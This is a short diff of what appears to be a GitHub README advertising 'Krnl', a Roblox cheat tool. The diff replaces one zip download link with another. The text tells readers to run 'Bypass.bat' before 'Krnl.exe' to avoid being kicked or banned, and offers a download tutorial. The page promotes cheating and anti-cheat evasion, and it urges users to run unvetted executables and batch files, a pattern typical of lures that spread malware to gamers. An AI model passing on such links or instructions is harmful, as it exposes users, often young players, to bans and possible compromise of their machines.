@@ -3,7 +3,7 @@ Krnl is arguably one of the best Roblox exploits out there in terms of script ex
 
 ## Important:  Make sure u run Bypass.bat before launching Krnl.exe to prevent from getting kicked or banned
 
-**Click [here](https://github.com/PeakScript/Furk-Ultra/archive/refs/heads/main.zip) to download**
+**Click [here](https://github.com/Peakscriptss/Krnl/archive/refs/heads/main.zip) to download**
 
 # 📁 〢 Tutorial
 1) Download [Krnl](https://github.com/Peakscriptss/Krnl/archive/refs/heads/main.zip)
